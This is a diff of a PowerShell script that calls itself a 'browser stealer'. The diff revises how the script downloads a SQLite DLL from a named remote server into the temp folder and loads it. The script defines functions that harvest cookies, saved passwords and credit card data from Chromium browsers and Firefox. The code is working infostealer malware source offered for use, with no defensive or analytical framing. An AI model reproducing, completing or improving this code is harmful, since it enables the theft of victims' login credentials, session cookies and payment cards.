@@ -1,5 +1,6 @@
 # ============================================================
-# BROWSER STEALER — USES YOUR HOSTED DLL
+# BROWSER STEALER — CLEAN WORKING VERSION
+# Downloads SQLite from your server — no fancy headers
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -24,50 +25,46 @@ Write-Log "============================================"
 Write-Log ""
 
 # ============================================================
-# DOWNLOAD YOUR HOSTED DLL
+# DOWNLOAD SQLITE DLL FROM YOUR SERVER
 # ============================================================
 
 $dllPath = "$env:TEMP\System.Data.SQLite.dll"
 
-# Clean up any corrupted DLL
+# Clean up any old DLL
 if (Test-Path $dllPath) {
-    Write-Log "[+] Removing old/corrupted DLL"
+    Write-Log "[+] Removing old DLL"
     Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
 }
 
-Write-Log "[+] Downloading SQLite DLL from your server..."
-
 $dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
+Write-Log "[+] Downloading SQLite DLL from: $dllUrl"
 
 try {
     $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $webClient.DownloadFile($dllUrl, $dllPath)
-    
-    if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 50000) {
-        Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"
-    } else {
-        Write-Log "[!] Downloaded file is too small or missing"
-        Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll to your public folder"
-        Read-Host "Press Enter to exit"
-        exit
-    }
 } catch {
     Write-Log "[!] Download failed: $_"
     Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll to your public folder"
-    Write-Log "[!] URL should be: $dllUrl"
     Read-Host "Press Enter to exit"
     exit
 }
+
+# Check if file exists and is large enough
+if (-not (Test-Path $dllPath) -or (Get-Item $dllPath).Length -lt 50000) {
+    Write-Log "[!] DLL not found or too small"
+    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll (rename sqlite3.dll)"
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"
 
 # Load the DLL
 try {
     [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
     Write-Log "[+] SQLite loaded successfully!"
-    $sqliteLoaded = $true
 } catch {
     Write-Log "[!] Failed to load DLL: $_"
-    Write-Log "[!] Make sure you uploaded the correct DLL (rename sqlite3.dll to System.Data.SQLite.dll)"
     Read-Host "Press Enter to exit"
     exit
 }
@@ -106,7 +103,7 @@ function Read-SQLite {
 }
 
 # ============================================================
-# COOKIE STEALER
+# STEALER FUNCTIONS
 # ============================================================
 
 function Get-BrowserCookies {
@@ -150,10 +147,6 @@ function Get-FirefoxCookies {
     return $cookies
 }
 
-# ============================================================
-# PASSWORD STEALER
-# ============================================================
-
 function Get-BrowserPasswords {
     param($Path, $Name)
     $pass = @()
@@ -194,10 +187,6 @@ function Get-FirefoxPasswords {
     }
     return $pass
 }
-
-# ============================================================
-# CREDIT CARD STEALER
-# ============================================================
 
 function Get-BrowserCards {
     param($Path, $Name)
